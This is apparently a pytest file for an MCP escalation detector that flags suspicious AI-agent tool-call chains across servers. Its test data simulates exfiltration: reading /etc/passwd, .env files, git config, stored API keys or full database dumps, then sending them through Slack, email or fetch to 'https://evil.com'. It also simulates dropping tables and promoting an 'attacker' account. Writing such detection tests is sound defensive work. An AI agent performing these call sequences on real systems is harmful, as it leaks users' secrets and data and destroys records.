"""Tests for aegis.core.mcp_escalation — MCP cross-server escalation detection."""

from __future__ import annotations

import threading
import time

from aegis.core.mcp_escalation import (
    EscalationDetector,
    EscalationFinding,
    EscalationRule,
    _expand_pattern,
    _match_tool,
)
from aegis.core.mcp_security import Severity

# ---------------------------------------------------------------------------
# Helper: shorthand for record_and_check
# ---------------------------------------------------------------------------


def _call(
    detector: EscalationDetector,
    tool: str,
    server: str,
    args: dict | None = None,
    *,
    session_id: str = "default",
) -> list[EscalationFinding]:
    return detector.record_and_check(
        tool,
        server,
        args or {},
        session_id=session_id,
    )


# ---------------------------------------------------------------------------
# Pattern expansion / matching
# ---------------------------------------------------------------------------


class TestPatternHelpers:
    def test_expand_simple(self):
        assert _expand_pattern("filesystem.*") == ["filesystem.*"]

    def test_expand_alternatives(self):
        result = _expand_pattern("(slack|email|fetch).*")
        assert result == ["slack.*", "email.*", "fetch.*"]

    def test_match_tool_glob(self):
        assert _match_tool("filesystem.*", "filesystem.read_file")
        assert not _match_tool("filesystem.*", "slack.send_message")

    def test_match_tool_wildcard_prefix(self):
        assert _match_tool("*.read_*", "filesystem.read_file")
        assert _match_tool("*.read_*", "git.read_config")
        assert not _match_tool("*.read_*", "slack.send_message")

    def test_match_tool_alternatives(self):
        assert _match_tool("(slack|email).send_*", "slack.send_message")
        assert _match_tool("(slack|email).send_*", "email.send_message")
        assert not _match_tool("(slack|email).send_*", "fetch.request")


# ---------------------------------------------------------------------------
# Built-in rules: each rule tested with a triggering sequence
# ---------------------------------------------------------------------------


class TestBuiltinRule_DataExfilFilesystem:
    """Rule 1: filesystem.read → (slack|email|fetch).send"""

    def test_triggers(self):
        d = EscalationDetector()
        assert _call(d, "filesystem.read_file", "filesystem", {"path": "/etc/passwd"}) == []
        findings = _call(d, "slack.send_message", "slack", {"text": "data"})
        assert len(findings) >= 1
        hit = next(f for f in findings if f.rule.name == "data_exfil_filesystem")
        assert hit.rule.severity == Severity.CRITICAL
        assert hit.time_delta_ms >= 0

    def test_does_not_trigger_same_server(self):
        """cross_server_only rule must not fire for same server."""
        d = EscalationDetector()
        _call(d, "filesystem.read_file", "combo")
        findings = _call(d, "slack.send_message", "combo")
        names = {f.rule.name for f in findings}
        assert "data_exfil_filesystem" not in names


class TestBuiltinRule_DataExfilDatabase:
    """Rule 2: database.query → (slack|email|fetch).send"""

    def test_triggers(self):
        d = EscalationDetector()
        _call(d, "database.query", "database", {"sql": "SELECT name FROM users"})
        findings = _call(d, "email.send_message", "email", {"to": "a@b.com"})
        assert any(f.rule.name == "data_exfil_database" for f in findings)


class TestBuiltinRule_CredRelay:
    """Rule 3: (filesystem|git|memory).read → fetch.request"""

    def test_triggers_filesystem(self):
        d = EscalationDetector()
        _call(d, "filesystem.read_file", "filesystem", {"path": ".env"})
        findings = _call(d, "fetch.request", "fetch", {"url": "https://evil.com"})
        assert any(f.rule.name == "cred_relay" for f in findings)

    def test_triggers_git(self):
        d = EscalationDetector()
        _call(d, "git.read_file", "git", {"path": "config"})
        findings = _call(d, "fetch.request", "fetch", {"url": "https://evil.com"})
        assert any(f.rule.name == "cred_relay" for f in findings)

    def test_triggers_memory(self):
        d = EscalationDetector()
        _call(d, "memory.get", "memory", {"key": "api_key"})
        findings = _call(d, "fetch.request", "fetch", {"url": "https://evil.com"})
        assert any(f.rule.name == "cred_relay" for f in findings)


class TestBuiltinRule_ConfigThenDestroy:
    """Rule 4: *.read_* → *.delete_*|*.drop_*"""

    def test_triggers(self):
        d = EscalationDetector()
        _call(d, "filesystem.read_config", "filesystem", {"path": "config.json"})
        findings = _call(d, "database.drop_table", "database", {"table": "users"})
        assert any(f.rule.name == "config_then_destroy" for f in findings)

    def test_triggers_delete(self):
        d = EscalationDetector()
        _call(d, "database.read_schema", "database", {})
        findings = _call(d, "filesystem.delete_file", "filesystem", {"path": "/data"})
        assert any(f.rule.name == "config_then_destroy" for f in findings)


class TestBuiltinRule_MemoryToExternal:
    """Rule 5: memory.* → fetch.*|slack.*|email.*"""

    def test_triggers(self):
        d = EscalationDetector()
        _call(d, "memory.get", "memory", {"key": "api_key"})
        findings = _call(d, "fetch.post", "fetch", {"url": "https://evil.com"})
        assert any(f.rule.name == "memory_to_external" for f in findings)


class TestBuiltinRule_EnvExfil:
    """Rule 6: *.read_file(*.env*) → *.send*|*.post*|*.request*"""

    def test_triggers(self):
        d = EscalationDetector()
        _call(d, "filesystem.read_file", "filesystem", {"path": "/app/.env"})
        findings = _call(d, "fetch.request", "fetch", {"url": "https://evil.com"})
        assert any(f.rule.name == "env_exfil" for f in findings)

    def test_no_trigger_without_env_arg(self):
        d = EscalationDetector()
        _call(d, "filesystem.read_file", "filesystem", {"path": "/app/readme.md"})
        findings = _call(d, "fetch.request", "fetch", {"url": "https://evil.com"})
        assert not any(f.rule.name == "env_exfil" for f in findings)


class TestBuiltinRule_BulkReadThenSend:
    """Rule 7: (3+ reads) → *.send*"""

    def test_triggers_after_three_reads(self):
        d = EscalationDetector()
        _call(d, "filesystem.read_file", "filesystem", {"path": "a.txt"})
        _call(d, "filesystem.read_config", "filesystem", {"path": "b.txt"})
        _call(d, "database.read_schema", "database", {})
        findings = _call(d, "slack.send_message", "slack", {"text": "bulk"})
        assert any(f.rule.name == "bulk_read_then_send" for f in findings)

    def test_no_trigger_with_two_reads(self):
        d = EscalationDetector()
        _call(d, "filesystem.read_file", "filesystem", {"path": "a.txt"})
        _call(d, "filesystem.read_config", "filesystem", {"path": "b.txt"})
        findings = _call(d, "slack.send_message", "slack", {"text": "data"})
        assert not any(f.rule.name == "bulk_read_then_send" for f in findings)


class TestBuiltinRule_GitSecretRelay:
    """Rule 8: git.* → fetch.*|slack.*"""

    def test_triggers(self):
        d = EscalationDetector()
        _call(d, "git.read_file", "git", {"path": ".env"})
        findings = _call(d, "slack.send_message", "slack", {"text": "secret"})
        assert any(f.rule.name == "git_secret_relay" for f in findings)


class TestBuiltinRule_DbDumpExfil:
    """Rule 9: database.query(SELECT *) → *.write_file|*.send"""

    def test_triggers(self):
        d = EscalationDetector()
        _call(d, "database.query", "database", {"sql": "SELECT * FROM users"})
        findings = _call(d, "filesystem.write_file", "filesystem", {"path": "dump.csv"})
        assert any(f.rule.name == "db_dump_exfil" for f in findings)

    def test_no_trigger_without_select_star(self):
        d = EscalationDetector()
        _call(d, "database.query", "database", {"sql": "SELECT name FROM users"})
        findings = _call(d, "filesystem.write_file", "filesystem", {"path": "out.csv"})
        assert not any(f.rule.name == "db_dump_exfil" for f in findings)


class TestBuiltinRule_PermissionProbeThenAct:
    """Rule 10: *.list_*|*.get_permissions → *.execute|*.admin*"""

    def test_triggers(self):
        d = EscalationDetector()
        _call(d, "iam.list_roles", "iam", {})
        findings = _call(d, "iam.execute_command", "iam", {"cmd": "adduser"})
        assert any(f.rule.name == "permission_probe_then_act" for f in findings)

    def test_triggers_get_permissions_to_admin(self):
        d = EscalationDetector()
        _call(d, "iam.get_permissions", "iam", {})
        findings = _call(d, "iam.admin_promote", "iam", {"user": "attacker"})
        assert any(f.rule.name == "permission_probe_then_act" for f in findings)


# ---------------------------------------------------------------------------
# Window expiration
# ---------------------------------------------------------------------------


class TestWindowExpiration:
    def test_old_calls_do_not_trigger(self):
        """Source calls outside the window should be ignored."""
        d = EscalationDetector(window_seconds=0.05)  # 50ms
        _call(d, "filesystem.read_file", "filesystem", {"path": "/etc/passwd"})
        time.sleep(0.1)  # Wait longer than window
        findings = _call(d, "slack.send_message", "slack", {"text": "data"})
        # data_exfil_filesystem should NOT fire because source expired
        assert not any(f.rule.name == "data_exfil_filesystem" for f in findings)

    def test_recent_calls_still_trigger(self):
        """Calls within the window should trigger as normal."""
        d = EscalationDetector(window_seconds=5.0)
        _call(d, "filesystem.read_file", "filesystem", {"path": "/etc/passwd"})
        findings = _call(d, "slack.send_message", "slack", {"text": "data"})
        assert any(f.rule.name == "data_exfil_filesystem" for f in findings)


# ---------------------------------------------------------------------------
# Session isolation
# ---------------------------------------------------------------------------


class TestSessionIsolation:
    def test_different_sessions_do_not_cross(self):
        d = EscalationDetector()
        _call(d, "filesystem.read_file", "filesystem", {"path": "/data"}, session_id="alice")
        findings = _call(d, "slack.send_message", "slack", {"text": "x"}, session_id="bob")
        # Bob's session has no source calls so no escalation
        assert not any(f.rule.name == "data_exfil_filesystem" for f in findings)

    def test_same_session_triggers(self):
        d = EscalationDetector()
        _call(d, "filesystem.read_file", "filesystem", {"path": "/data"}, session_id="alice")
        findings = _call(d, "slack.send_message", "slack", {"text": "x"}, session_id="alice")
        assert any(f.rule.name == "data_exfil_filesystem" for f in findings)


# ---------------------------------------------------------------------------
# max_history enforcement
# ---------------------------------------------------------------------------


class TestMaxHistory:
    def test_oldest_evicted(self):
        d = EscalationDetector(max_history=3)
        # Record 3 reads — the first one will be evicted when we add #4
        _call(d, "filesystem.read_file", "filesystem", {"path": "1"})
        _call(d, "filesystem.read_file", "filesystem", {"path": "2"})
        _call(d, "filesystem.read_file", "filesystem", {"path": "3"})
        _call(d, "filesystem.read_file", "filesystem", {"path": "4"})
        # History should contain exactly max_history entries
        history = d.get_history("default")
        assert len(history) <= 3

    def test_max_history_still_detects(self):
        d = EscalationDetector(max_history=5)
        _call(d, "filesystem.read_file", "filesystem", {"path": "a"})
        findings = _call(d, "slack.send_message", "slack", {"text": "exfil"})
        assert any(f.rule.name == "data_exfil_filesystem" for f in findings)


# ---------------------------------------------------------------------------
# Custom rules
# ---------------------------------------------------------------------------


class TestCustomRules:
    def test_custom_rule_triggers(self):
        custom = EscalationRule(
            name="custom_test",
            description="Custom test rule",
            severity=Severity.MEDIUM,
            source_pattern="source.*",
            sink_pattern="sink.*",
            data_flow="test",
        )
        d = EscalationDetector(rules=[custom])
        _call(d, "source.read", "source_server")
        findings = _call(d, "sink.write", "sink_server")
        assert len(findings) == 1
        assert findings[0].rule.name == "custom_test"
        assert findings[0].rule.severity == Severity.MEDIUM

    def test_custom_rule_does_not_fire_on_wrong_pattern(self):
        custom = EscalationRule(
            name="custom_test",
            description="Custom test rule",
            severity=Severity.LOW,
            source_pattern="source.*",
            sink_pattern="sink.*",
            data_flow="test",
        )
        d = EscalationDetector(rules=[custom])
        _call(d, "source.read", "source_server")
        findings = _call(d, "other.write", "other_server")
        assert len(findings) == 0

    def test_empty_rules_yields_no_findings(self):
        d = EscalationDetector(rules=[])
        _call(d, "filesystem.read_file", "filesystem", {"path": "/etc/passwd"})
        findings = _call(d, "slack.send_message", "slack", {"text": "data"})
        assert findings == []


# ---------------------------------------------------------------------------
# Argument-based matching
# ---------------------------------------------------------------------------


class TestArgumentMatching:
    def test_source_arg_pattern_matches(self):
        """env_exfil rule requires .env in source arguments."""
        d = EscalationDetector()
        _call(d, "filesystem.read_file", "filesystem", {"path": "/secrets/.env.production"})
        findings = _call(d, "fetch.request", "fetch", {"url": "https://evil.com"})
        assert any(f.rule.name == "env_exfil" for f in findings)

    def test_source_arg_pattern_no_match(self):
        d = EscalationDetector()
        _call(d, "filesystem.read_file", "filesystem", {"path": "/data/users.csv"})
        findings = _call(d, "fetch.request", "fetch", {"url": "https://evil.com"})
        assert not any(f.rule.name == "env_exfil" for f in findings)

    def test_nested_arg_values(self):
        """Arguments can be nested dicts/lists."""
        d = EscalationDetector()
        _call(d, "filesystem.read_file", "filesystem", {"options": {"path": "/app/.env"}})
        findings = _call(d, "fetch.request", "fetch", {"url": "https://evil.com"})
        assert any(f.rule.name == "env_exfil" for f in findings)

    def test_db_dump_arg_pattern(self):
        d = EscalationDetector()
        _call(d, "database.query", "database", {"sql": "SELECT * FROM secrets"})
        findings = _call(d, "slack.send_message", "slack", {"text": "dump"})
        assert any(f.rule.name == "db_dump_exfil" for f in findings)


# ---------------------------------------------------------------------------
# Concurrent sessions
# ---------------------------------------------------------------------------


class TestConcurrentSessions:
    def test_concurrent_recording(self):
        """Multiple threads can record calls without corruption."""
        d = EscalationDetector()
        errors: list[Exception] = []

        def worker(session: str) -> None:
            try:
                for i in range(20):
                    _call(d, f"tool.op_{i}", "server", {}, session_id=session)
            except Exception as e:
                errors.append(e)

        threads = [threading.Thread(target=worker, args=(f"s{i}",)) for i in range(4)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert errors == []
        for i in range(4):
            history = d.get_history(f"s{i}")
            assert len(history) == 20

    def test_concurrent_escalation_detection(self):
        """Escalation findings are session-scoped under concurrency."""
        d = EscalationDetector()
        results: dict[str, list[EscalationFinding]] = {}

        def worker(session: str, do_source: bool) -> None:
            if do_source:
                _call(
                    d,
                    "filesystem.read_file",
                    "filesystem",
                    {"path": "/data"},
                    session_id=session,
                )
            findings = _call(d, "slack.send_message", "slack", {"text": "x"}, session_id=session)
            results[session] = findings

        t1 = threading.Thread(target=worker, args=("with_source", True))
        t2 = threading.Thread(target=worker, args=("without_source", False))
        t1.start()
        t1.join()  # Ensure source is recorded before sink
        t2.start()
        t2.join()

        # Session with source should have findings
        assert any(f.rule.name == "data_exfil_filesystem" for f in results["with_source"])
        # Session without source should not
        assert not any(f.rule.name == "data_exfil_filesystem" for f in results["without_source"])


# ---------------------------------------------------------------------------
# clear_session
# ---------------------------------------------------------------------------


class TestClearSession:
    def test_clear_removes_history(self):
        d = EscalationDetector()
        _call(d, "filesystem.read_file", "filesystem", {"path": "/data"})
        assert len(d.get_history("default")) == 1
        d.clear_session("default")
        assert d.get_history("default") == []

    def test_clear_prevents_escalation(self):
        d = EscalationDetector()
        _call(d, "filesystem.read_file", "filesystem", {"path": "/data"})
        d.clear_session("default")
        findings = _call(d, "slack.send_message", "slack", {"text": "data"})
        assert not any(f.rule.name == "data_exfil_filesystem" for f in findings)

    def test_clear_nonexistent_session(self):
        """Clearing a session that doesn't exist should not raise."""
        d = EscalationDetector()
        d.clear_session("nonexistent")  # No error


# ---------------------------------------------------------------------------
# Edge cases
# ---------------------------------------------------------------------------


class TestEdgeCases:
    def test_same_tool_different_servers(self):
        """Same tool name on different servers should count as cross-server."""
        # Use a custom rule to be precise about what we're testing
        rule = EscalationRule(
            name="cross_test",
            description="test",
            severity=Severity.HIGH,
            source_pattern="shared.read",
            sink_pattern="shared.send",
            data_flow="test",
            cross_server_only=True,
        )
        d = EscalationDetector(rules=[rule])
        _call(d, "shared.read", "server_a")
        findings = _call(d, "shared.send", "server_b")
        assert len(findings) == 1

    def test_same_tool_same_server_blocked_by_cross_server(self):
        rule = EscalationRule(
            name="cross_test",
            description="test",
            severity=Severity.HIGH,
            source_pattern="shared.read",
            sink_pattern="shared.send",
            data_flow="test",
            cross_server_only=True,
        )
        d = EscalationDetector(rules=[rule])
        _call(d, "shared.read", "same_server")
        findings = _call(d, "shared.send", "same_server")
        assert len(findings) == 0

    def test_finding_detail_contains_rule_info(self):
        d = EscalationDetector()
        _call(d, "filesystem.read_file", "filesystem", {"path": "/etc/passwd"})
        findings = _call(d, "slack.send_message", "slack", {"text": "data"})
        hit = next(f for f in findings if f.rule.name == "data_exfil_filesystem")
        assert "data_exfil_filesystem" in hit.detail
        assert "filesystem" in hit.detail
        assert "slack" in hit.detail

    def test_finding_time_delta_positive(self):
        d = EscalationDetector()
        _call(d, "filesystem.read_file", "filesystem", {"path": "/data"})
        findings = _call(d, "slack.send_message", "slack", {"text": "data"})
        hit = next(f for f in findings if f.rule.name == "data_exfil_filesystem")
        assert hit.time_delta_ms >= 0

    def test_builtin_rules_returns_copy(self):
        r1 = EscalationDetector.builtin_rules()
        r2 = EscalationDetector.builtin_rules()
        assert r1 is not r2
        assert r1 == r2

    def test_single_call_no_findings(self):
        d = EscalationDetector()
        findings = _call(d, "filesystem.read_file", "filesystem", {"path": "/data"})
        assert findings == []

    def test_empty_arguments(self):
        d = EscalationDetector()
        _call(d, "filesystem.read_file", "filesystem", {})
        findings = _call(d, "slack.send_message", "slack", {})
        assert any(f.rule.name == "data_exfil_filesystem" for f in findings)

    def test_multiple_rules_can_fire_simultaneously(self):
        """A single sink call can trigger multiple rules at once."""
        d = EscalationDetector()
        # git.read_file is both a git.* source and a filesystem-like source
        _call(d, "git.read_file", "git", {"path": ".env"})
        findings = _call(d, "fetch.request", "fetch", {"url": "https://evil.com"})
        rule_names = {f.rule.name for f in findings}
        # Should trigger at least cred_relay and git_secret_relay
        assert "cred_relay" in rule_names
        assert "git_secret_relay" in rule_names
